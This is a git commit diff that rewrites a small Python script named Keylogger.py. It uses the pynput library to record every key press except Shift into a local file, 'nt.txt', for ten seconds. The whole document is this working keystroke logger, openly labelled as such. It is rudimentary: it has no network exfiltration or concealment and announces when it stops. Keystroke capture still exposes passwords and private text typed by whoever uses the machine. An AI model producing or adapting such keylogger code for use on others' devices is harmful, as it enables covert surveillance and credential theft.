18a8b2c141686e2f19fca83fc9ae324037709a72
Swayamjeet <128211376+Swayamjeet7@users.noreply.github.com>
2023-12-19 00:38:37 +0530

    Add files via upload

--- Keylogger.py
+++ Keylogger.py
@@ -1,10 +1,16 @@
 from threading import Timer
-from pynput.keyboard import Listener
+from pynput import keyboard
+
+f = open('nt.txt','w')
 
 def on_press(key):
-    print(key)
-
-with Listener(on_press=on_press) as l:
-    Timer(5, l.stop).start()
+    global x
+    if key != keyboard.Key.shift:
+        f.write(f'pressed {key}\n')   
+    
+with keyboard.Listener(on_press=on_press) as l:
+    Timer(10, l.stop).start()
     l.join()
-    print('5 seconds passed')
+    print('10 seconds passed')
+
+f.close()
